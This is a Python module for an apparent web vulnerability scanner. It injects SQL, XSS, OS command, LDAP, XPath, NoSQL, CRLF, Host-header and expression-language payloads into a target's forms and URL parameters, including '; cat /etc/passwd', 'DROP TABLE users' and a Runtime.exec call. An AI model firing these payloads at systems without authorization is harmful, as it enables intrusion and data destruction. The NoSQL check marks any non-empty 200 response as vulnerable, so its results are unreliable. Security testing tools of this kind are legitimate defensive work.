import aiohttp
from urllib.parse import urljoin, urlencode, quote
from ..base import BaseModule
from ..models import VulnerabilityResult, Severity


class InjectionScanner(BaseModule):
    """Scans for: SQL Injection, XSS Reflected, XSS Stored detection,
    HTML Injection, Command Injection, LDAP Injection, CRLF Injection,
    Host Header Injection, NoSQL Injection"""

    SQL_PAYLOADS = [
        "' OR '1'='1", "' OR '1'='1'--", "' UNION SELECT NULL--",
        "1' AND '1'='1", "\" OR \"1\"=\"1", "1; DROP TABLE users--",
        "' OR 1=1#", "admin'--", "1' ORDER BY 1--",
    ]

    XSS_PAYLOADS = [
        "<script>alert('xss')</script>",
        "\"><script>alert('xss')</script>",
        "'\"><img src=x onerror=alert('xss')>",
        "<svg onload=alert('xss')>",
        "javascript:alert('xss')",
        "<img src=x onerror=alert(1)>",
        "<body onload=alert('xss')>",
    ]

    HTML_PAYLOADS = [
        "<h1>injected</h1>", "<marquee>injected</marquee>",
        "<b>injected</b>", "<iframe src='about:blank'></iframe>",
    ]

    CMD_PAYLOADS = [
        "; ls", "| ls", "& ls", "; cat /etc/passwd",
        "| cat /etc/passwd", "; whoami", "| whoami",
        "& whoami", "`whoami`", "$(whoami)",
    ]

    CRLF_PAYLOADS = [
        "%0d%0aSet-Cookie:crlf=injection",
        "%0d%0aInjected-Header:true",
        "\r\nSet-Cookie:crlf=injection",
    ]

    NOSQL_PAYLOADS = [
        '{"$gt":""}', '{"$ne":""}', '{"$regex":".*"}',
    ]

    XPATH_PAYLOADS = [
        "' or '1'='1", "' or ''='", "1' or '1'='1' or '1'='1",
        "'] | //* | //*['", "<!--", "admin' or '1'='1",
    ]

    EL_PAYLOADS = [
        "${7*7}", "#{7*7}", "${applicationScope}",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
    ]

    async def scan(self, target_url: str, session: aiohttp.ClientSession) -> list[VulnerabilityResult]:
        results = []
        html, resp = await self.fetch_text(session, target_url)
        if not html:
            return results

        forms = self._extract_forms(html, target_url)
        params = self._extract_url_params(target_url)

        results.extend(await self._scan_sql_injection(session, target_url, forms, params))
        results.extend(await self._scan_xss(session, target_url, forms, params))
        results.extend(await self._scan_html_injection(session, target_url, forms, params))
        results.extend(await self._scan_command_injection(session, target_url, forms, params))
        results.extend(await self._scan_crlf_injection(session, target_url))
        results.extend(await self._scan_host_header_injection(session, target_url))
        results.extend(await self._scan_nosql_injection(session, target_url, forms))
        results.extend(await self._scan_ldap_injection(session, target_url, forms))
        results.extend(await self._scan_xpath_injection(session, target_url, forms))
        results.extend(await self._scan_el_injection(session, target_url, forms))

        return results

    def _extract_forms(self, html: str, base_url: str) -> list:
        soup = self.parse_html(html)
        forms = []
        for form in soup.find_all("form"):
            action = form.get("action", "")
            method = form.get("method", "get").upper()
            action_url = urljoin(base_url, action) if action else base_url
            inputs = []
            for inp in form.find_all(["input", "textarea", "select"]):
                name = inp.get("name")
                if name:
                    inp_type = inp.get("type", "text")
                    value = inp.get("value", "")
                    inputs.append({"name": name, "type": inp_type, "value": value})
            if inputs:
                forms.append({"action": action_url, "method": method, "inputs": inputs})
        return forms

    def _extract_url_params(self, url: str) -> list:
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        return [{"name": k, "value": v[0] if v else ""} for k, v in params.items()]

    async def _scan_sql_injection(self, session, target_url, forms, params) -> list:
        results = []
        detected = False
        evidence = ""
        endpoint = ""
        param_name = ""

        sql_errors = [
            "you have an error in your sql syntax", "warning: mysql",
            "unclosed quotation mark", "quoted string not properly terminated",
            "microsoft ole db provider for sql server", "ora-01756",
            "postgresql", "sqlite3", "sqlstate", "syntax error",
            "mysql_fetch", "pg_query", "sql error", "database error",
        ]

        for form in forms:
            for inp in form["inputs"]:
                if inp["type"] in ("submit", "hidden", "button"):
                    continue
                for payload in self.SQL_PAYLOADS[:5]:
                    data = {i["name"]: i["value"] for i in form["inputs"]}
                    data[inp["name"]] = payload
                    try:
                        if form["method"] == "POST":
                            async with session.post(form["action"], data=data, ssl=False, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                                text = await resp.text(errors="replace")
                        else:
                            async with session.get(form["action"], params=data, ssl=False, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                                text = await resp.text(errors="replace")
                        text_lower = text.lower()
                        for err in sql_errors:
                            if err in text_lower:
                                detected = True
                                evidence = f"SQL error detected with payload: {payload}"
                                endpoint = form["action"]
                                param_name = inp["name"]
                                break
                    except Exception:
                        pass
                    if detected:
                        break
                if detected:
                    break
            if detected:
                break

        for p in params:
            if detected:
                break
            for payload in self.SQL_PAYLOADS[:5]:
                try:
                    test_url = target_url.replace(f"{p['name']}={p['value']}", f"{p['name']}={quote(payload)}")
                    async with session.get(test_url, ssl=False, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                        text = await resp.text(errors="replace")
                    text_lower = text.lower()
                    for err in sql_errors:
                        if err in text_lower:
                            detected = True
                            evidence = f"SQL error in URL param with payload: {payload}"
                            endpoint = test_url
                            param_name = p["name"]
                            break
                except Exception:
                    pass
                if detected:
                    break

        results.append(self.make_result(
            bug_id="INJ-001", name="SQL Injection", severity=Severity.CRITICAL,
            category="Injection", description="Tes SQL Injection pada form dan URL parameters.",
            detected=detected, endpoint=endpoint, parameter=param_name, evidence=evidence,
        ))
        return results

    async def _scan_xss(self, session, target_url, forms, params) -> list:
        results = []
        detected = False
        evidence = ""
        endpoint = ""
        param_name = ""

        for form in forms:
            for inp in form["inputs"]:
                if inp["type"] in ("submit", "hidden", "button"):
                    continue
                for payload in self.XSS_PAYLOADS[:4]:
                    data = {i["name"]: i["value"] for i in form["inputs"]}
                    data[inp["name"]] = payload
                    try:
                        if form["method"] == "POST":
                            async with session.post(form["action"], data=data, ssl=False, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                                text = await resp.text(errors="replace")
                        else:
                            async with session.get(form["action"], params=data, ssl=False, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                                text = await resp.text(errors="replace")
                        if payload in text:
                            detected = True
                            evidence = f"XSS payload reflected: {payload}"
                            endpoint = form["action"]
                            param_name = inp["name"]
                            break
                    except Exception:
                        pass
                if detected:
                    break
            if detected:
                break

        for p in params:
            if detected:
                break
            for payload in self.XSS_PAYLOADS[:4]:
                try:
                    test_url = target_url.replace(f"{p['name']}={p['value']}", f"{p['name']}={quote(payload)}")
                    async with session.get(test_url, ssl=False, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                        text = await resp.text(errors="replace")
                    if payload in text:
                        detected = True
                        evidence = f"XSS reflected in URL param: {payload}"
                        endpoint = test_url
                        param_name = p["name"]
                        break
                except Exception:
                    pass

        results.append(self.make_result(
            bug_id="INJ-002", name="XSS (Cross-Site Scripting) Reflected", severity=Severity.HIGH,
            category="Injection", description="Tes XSS Reflected pada form dan URL parameters.",
            detected=detected, endpoint=endpoint, parameter=param_name, evidence=evidence,
        ))
        return results

    async def _scan_html_injection(self, session, target_url, forms, params) -> list:
        detected = False
        evidence = ""
        endpoint = ""
        param_name = ""

        for form in forms:
            for inp in form["inputs"]:
                if inp["type"] in ("submit", "hidden", "button"):
                    continue
                for payload in self.HTML_PAYLOADS[:2]:
                    data = {i["name"]: i["value"] for i in form["inputs"]}
                    data[inp["name"]] = payload
                    try:
                        if form["method"] == "POST":
                            async with session.post(form["action"], data=data, ssl=False, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                                text = await resp.text(errors="replace")
                        else:
                            async with session.get(form["action"], params=data, ssl=False, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                                text = await resp.text(errors="replace")
                        if payload in text:
                            detected = True
                            evidence = f"HTML payload reflected: {payload}"
                            endpoint = form["action"]
                            param_name = inp["name"]
                            break
                    except Exception:
                        pass
                if detected:
                    break
            if detected:
                break

        return [self.make_result(
            bug_id="INJ-004", name="HTML Injection", severity=Severity.MEDIUM,
            category="Injection", description="Tes HTML Injection pada form inputs.",
            detected=detected, endpoint=endpoint, parameter=param_name, evidence=evidence,
        )]

    async def _scan_command_injection(self, session, target_url, forms, params) -> list:
        detected = False
        evidence = ""
        endpoint = ""
        param_name = ""
        cmd_indicators = ["root:", "uid=", "gid=", "/bin/", "www-data", "daemon", "nobody"]

        for form in forms:
            for inp in form["inputs"]:
                if inp["type"] in ("submit", "hidden", "button"):
                    continue
                for payload in self.CMD_PAYLOADS[:4]:
                    data = {i["name"]: i["value"] for i in form["inputs"]}
                    data[inp["name"]] = payload
                    try:
                        if form["method"] == "POST":
                            async with session.post(form["action"], data=data, ssl=False, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                                text = await resp.text(errors="replace")
                        else:
                            async with session.get(form["action"], params=data, ssl=False, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                                text = await resp.text(errors="replace")
                        for indicator in cmd_indicators:
                            if indicator in text:
                                detected = True
                                evidence = f"Command output indicator found with payload: {payload}"
                                endpoint = form["action"]
                                param_name = inp["name"]
                                break
                    except Exception:
                        pass
                    if detected:
                        break
                if detected:
                    break
            if detected:
                break

        return [self.make_result(
            bug_id="INJ-005", name="Command Injection (OS Command)", severity=Severity.CRITICAL,
            category="Injection", description="Tes OS Command Injection pada form inputs.",
            detected=detected, endpoint=endpoint, parameter=param_name, evidence=evidence,
        )]

    async def _scan_crlf_injection(self, session, target_url) -> list:
        detected = False
        evidence = ""

        for payload in self.CRLF_PAYLOADS:
            try:
                test_url = target_url.rstrip("/") + "/" + payload
                async with session.get(test_url, ssl=False, allow_redirects=False, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    headers_str = str(resp.headers).lower()
                    if "crlf=injection" in headers_str or "injected-header" in headers_str:
                        detected = True
                        evidence = f"CRLF payload reflected in headers: {payload}"
                        break
            except Exception:
                pass

        return [self.make_result(
            bug_id="INJ-007", name="CRLF Injection", severity=Severity.MEDIUM,
            category="Injection", description="Tes CRLF Injection pada HTTP headers.",
            detected=detected, evidence=evidence,
        )]

    async def _scan_host_header_injection(self, session, target_url) -> list:
        detected = False
        evidence = ""

        evil_hosts = ["evil.com", "attacker.com"]
        for host in evil_hosts:
            try:
                headers = self._default_headers()
                headers["Host"] = host
                async with session.get(target_url, headers=headers, ssl=False,
                                       allow_redirects=False, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    text = await resp.text(errors="replace")
                    if host in text:
                        detected = True
                        evidence = f"Host header value '{host}' reflected in response body"
                        break
            except Exception:
                pass

        return [self.make_result(
            bug_id="INJ-008", name="Host Header Injection", severity=Severity.MEDIUM,
            category="Injection", description="Tes Host Header Injection.",
            detected=detected, evidence=evidence,
        )]

    async def _scan_nosql_injection(self, session, target_url, forms) -> list:
        detected = False
        evidence = ""
        endpoint = ""

        for form in forms:
            for payload in self.NOSQL_PAYLOADS:
                data = {}
                for inp in form["inputs"]:
                    data[inp["name"]] = payload
                try:
                    headers = self._default_headers()
                    headers["Content-Type"] = "application/json"
                    async with session.post(form["action"], data=str(data), headers=headers,
                                            ssl=False, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                        text = await resp.text(errors="replace")
                        if resp.status == 200 and len(text) > 0:
                            detected = True
                            evidence = f"NoSQL payload accepted: {payload}"
                            endpoint = form["action"]
                            break
                except Exception:
                    pass
            if detected:
                break

        return [self.make_result(
            bug_id="INJ-064", name="NoSQL Injection", severity=Severity.HIGH,
            category="Injection", description="Tes NoSQL Injection pada endpoints.",
            detected=detected, endpoint=endpoint, evidence=evidence,
        )]

    async def _scan_ldap_injection(self, session, target_url, forms) -> list:
        detected = False
        evidence = ""
        ldap_payloads = ["*", ")(cn=*)", "*(|(objectclass=*))", "*)(&", "*)(uid=*))(|(uid=*"]
        ldap_errors = ["ldap", "invalid dn", "bad search filter", "dsid", "ldaperr"]

        for form in forms:
            for inp in form["inputs"]:
                if inp["type"] in ("submit", "hidden", "button"):
                    continue
                for payload in ldap_payloads[:3]:
                    data = {i["name"]: i["value"] for i in form["inputs"]}
                    data[inp["name"]] = payload
                    try:
                        async with session.post(form["action"], data=data, ssl=False,
                                                timeout=aiohttp.ClientTimeout(total=10)) as resp:
                            text = (await resp.text(errors="replace")).lower()
                        for err in ldap_errors:
                            if err in text:
                                detected = True
                                evidence = f"LDAP error detected with payload: {payload}"
                                break
                    except Exception:
                        pass
                    if detected:
                        break
                if detected:
                    break
            if detected:
                break

        return [self.make_result(
            bug_id="INJ-006", name="LDAP Injection", severity=Severity.HIGH,
            category="Injection", description="Tes LDAP Injection pada form inputs.",
            detected=detected, evidence=evidence,
        )]

    async def _scan_xpath_injection(self, session, target_url, forms) -> list:
        detected = False
        evidence = ""
        xpath_errors = ["xpath", "xmlsyntaxerror", "invalid predicate", "unterminated", "xpatherror"]

        for form in forms:
            for inp in form["inputs"]:
                if inp["type"] in ("submit", "hidden", "button"):
                    continue
                for payload in self.XPATH_PAYLOADS[:3]:
                    data = {i["name"]: i["value"] for i in form["inputs"]}
                    data[inp["name"]] = payload
                    try:
                        if form["method"] == "POST":
                            async with session.post(form["action"], data=data, ssl=False,
                                                    timeout=aiohttp.ClientTimeout(total=10)) as resp:
                                text = (await resp.text(errors="replace")).lower()
                        else:
                            async with session.get(form["action"], params=data, ssl=False,
                                                   timeout=aiohttp.ClientTimeout(total=10)) as resp:
                                text = (await resp.text(errors="replace")).lower()
                        for err in xpath_errors:
                            if err in text:
                                detected = True
                                evidence = f"XPath error detected with payload: {payload}"
                                break
                    except Exception:
                        pass
                    if detected:
                        break
                if detected:
                    break
            if detected:
                break

        return [self.make_result(
            bug_id="INJ-010", name="XPath Injection", severity=Severity.HIGH,
            category="Injection", description="Tes XPath Injection pada form inputs.",
            detected=detected, evidence=evidence,
        )]

    async def _scan_el_injection(self, session, target_url, forms) -> list:
        detected = False
        evidence = ""

        for form in forms:
            for inp in form["inputs"]:
                if inp["type"] in ("submit", "hidden", "button"):
                    continue
                for payload in self.EL_PAYLOADS[:2]:
                    data = {i["name"]: i["value"] for i in form["inputs"]}
                    data[inp["name"]] = payload
                    try:
                        if form["method"] == "POST":
                            async with session.post(form["action"], data=data, ssl=False,
                                                    timeout=aiohttp.ClientTimeout(total=10)) as resp:
                                text = await resp.text(errors="replace")
                        else:
                            async with session.get(form["action"], params=data, ssl=False,
                                                   timeout=aiohttp.ClientTimeout(total=10)) as resp:
                                text = await resp.text(errors="replace")
                        if "49" in text and "${7*7}" in payload:
                            detected = True
                            evidence = f"Expression Language evaluated: {payload} → 49"
                            break
                        if "49" in text and "#{7*7}" in payload:
                            detected = True
                            evidence = f"Expression Language evaluated: {payload} → 49"
                            break
                    except Exception:
                        pass
                    if detected:
                        break
                if detected:
                    break
            if detected:
                break

        return [self.make_result(
            bug_id="INJ-011", name="Expression Language Injection", severity=Severity.CRITICAL,
            category="Injection", description="Tes Expression Language (EL) Injection pada form inputs.",
            detected=detected, evidence=evidence,
        )]
